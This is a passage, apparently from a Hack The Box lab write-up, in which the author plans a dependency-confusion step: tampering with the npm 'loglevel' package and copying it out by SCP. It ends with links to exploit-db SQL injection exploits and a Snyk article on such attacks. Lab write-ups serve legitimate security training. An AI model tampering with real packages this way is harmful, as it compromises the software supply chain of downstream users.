But it hangs, and my local registry tries to download "loglevel" from an official registry...

May-be the package is somehow broken / incomplete. Let's download the officiel "loglevel" and tamper it afterwards. The startup script installs it in `.npm`, so just SCP it out of the box.

[author-profile]: https://app.hackthebox.com/users/389926
[erms-repo]: https://www.sourcecodester.com/php/15160/simple-exam-reviewer-management-system-phpoop-free-source-code.html
[frontpage]: images/frontpage.png
[erms-sqli]: https://www.exploit-db.com/exploits/50725
[oretnom23]: https://www.google.com/search?q=oretnom23+exam+php
[sfms-admin-login]: images/sfms-admin-login.png
[sfms-sqli]: https://www.exploit-db.com/exploits/48437
[snyk-dca]: https://snyk.io/blog/detect-prevent-dependency-confusion-attacks-npm-supply-chain-security/
[student-portal]: images/student-portal.png
